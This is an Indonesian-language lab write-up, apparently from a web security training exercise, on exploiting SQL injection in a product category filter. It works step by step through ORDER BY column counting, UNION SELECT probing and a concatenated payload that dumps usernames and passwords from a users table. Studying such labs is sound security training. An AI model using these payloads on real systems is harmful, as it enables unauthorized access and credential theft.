# Overview
SQLI vuln di bagian product category filter.

Hint:
- menggunakan UNION
- lain kolom `username` dan `password` di tabel `users`

Goals:
- retrieve data dan login sebagai `administrator`

# Analisa
Cek dengan `'` apakah website vuln terhadap SQLI

Selanjutnya cek kolom yang digunakan oleh original query, gunakan payload `' order by n--`
- `' order by 1--` tidak ada perubahan
- `' order by 2--` terdapat perubahan urutan
- `' order by 3--` mendapat eror
Total kolom ada 2

Selanjutnya cek kolom yang dapat hold data string dengan query `' union select 'a',null--`

Karena hanya terdapat 1 kolom yang dapat hold string, maka kita perlu mengeluarkan string `username` dan `password` tersebut dalam 1 kolom dengan cara concatenate. Gunakan payload : `'union select null, kolom from tabel--`
- `' union select null, username from users--`
- `' union select null, password from users--`
Untuk melakukan concatenate kita dapat menggunakan `||` pipe untuk menyambungkannya, jadi payloadnya adalah:
- `' union select null,username || ':' || password from users--`
